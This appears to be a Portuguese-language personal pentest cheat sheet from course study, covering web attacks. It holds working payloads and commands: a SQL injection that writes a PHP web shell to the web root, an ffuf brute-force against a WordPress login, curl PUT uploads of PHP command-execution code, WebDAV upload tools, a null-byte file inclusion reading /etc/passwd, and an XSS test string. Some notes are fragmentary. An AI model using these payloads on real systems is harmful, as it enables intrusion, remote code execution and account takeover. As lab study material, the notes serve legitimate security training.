select * from usuarios where login='' union select 1,2,"<?php SYSTEM($_GET['param'])>" INTO OUTFILE '/var/www/html/payload.php';


```
obs: no exemplo abaixo a tabela possui 3 colunas:

**Addslashes**
exibe os caracteres em hexadecimal
```
echo -n 'frase qualquer' | od -An -tdC
```

## ferramentas de fuzzing
- gobuster
- ffuf

### gobuster

```
gobuster dir -u <URL:PORT> -w <WORDLIST> [-x .php,.txt,.bkp,.sql] [-t THREADS] -e [-s HTTP_CODE_RESPONSE] [-a USER_AGENT] 
```

```
gobuster -u http://10.10.206.2 -w ~/wordlist/SecLists/Discovery/Web-Content/raft-large-directories.txt -t 100 -e 
```
-e printa a url toda
-t numero de threads
-u url
-x string              File extension(s) to search for (dir mode only)
-p string              Proxy to use for requests [http(s)://host:port] (dir mode only)

### ffuf
bruteforce de +1 parametro
```
ffuf -w users.txt:USER -w passwords.txt:PASS -u http://blog.thm/wp-login.php -X POST -H "Content-Type: application/x-www-form-urlencoded" -d "log=USER&pwd=PASS&wp-submit=Log+In&redirect_to=http%3A%2F%2Fblog.thm%2Fwp-admin%2F&testcookie=1"
```

proxy burp `-x`
```
-x http://127.0.0.1:8080
```

header `-H`
```
-H "Content-Type: application/x-www-form-urlencoded" -H "Cookie: wordpress_test_cookie=WP+Cookie+check" 
```

filtrando resposta `fr`
```
-fr "Invalid username"
```
não exibe resultados que contenham a frase `Invalid username`




## metodos aceitos (get, put, options, head,post)
- validar os métodos aceitos em cada um dos diretórios da aplicação

**curl**
```
curl -v -X options <URL>
```
metodos com curl
```
curl -X PUT <URL/teste.php>
curl -X PUT <URL/teste.php> -d "<?php system('id');?>"
curl [-v] <URL> --upload-file shell.php
curl -X DELETE <URL/teste.php>
```

netcat:
```
nc -v <IP> <PORT> -C
PUT /webdav/teste.php HTTP/1.1
Host: <IP>
```

### WEBDAV
é um conjunto de extensões para o protocolo HTTP que permite que os usuários gerenciem arquivos em servidores remotos

utilitário para estabelecer conexão com webdav
```
cadaver <URL>
```
testa os métodos http e envia arquivos para o servidor
```
davtest --url <URL>
```


## null byte poisoning
caso o servidor adicione `.php` automaticamente ao final de `file`, o null byte (`%00`) interrompe o processamento da string, resultando na tentativa de carregar o arquivo `/etc/passwd` diretamente, ignorando a extensão.
```
GET /index.php?file=/etc/passwd%00 HTTP/1.1
```
FALTA FAZER
testar o null byte com rfi
https://academy.desecsecurity.com/novo-pentest-profissional/aula/bkt5ZVZka3RNVFEzTUE9PQ==
## Local File Inclusion (LFI)
infecção de logs com LFI/php
FALTA FAZER (testar no 172.16.1.10)
https://academy.desecsecurity.com/novo-pentest-profissional/aula/JE1DdkBjTHJNVFEyT1E9PQ==


## XSS
ferramenta para automatizar teste de XSS
```
https://github.com/s0md3v/XSStrike.git
```

### reflected
```
<script>alert("VULNERAVEL")<script>
```
payloads: https://github.com/payloadbox/xss-payload-list


### self

### stored
